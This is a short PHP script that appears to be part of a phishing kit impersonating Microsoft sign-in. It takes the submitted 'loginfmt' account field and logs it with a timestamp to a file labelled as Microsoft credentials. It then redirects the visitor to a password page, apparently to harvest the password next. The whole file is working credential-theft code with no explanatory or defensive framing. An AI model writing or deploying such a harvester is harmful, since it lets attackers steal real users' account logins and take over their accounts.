<?php

file_put_contents("usernames.txt", date("m/d/Y") . " " . date("h:i:s") . " Microsoft Cred: " . $_POST['loginfmt'] . "\n", FILE_APPEND);

header('Location: password.html');

exit();

?>
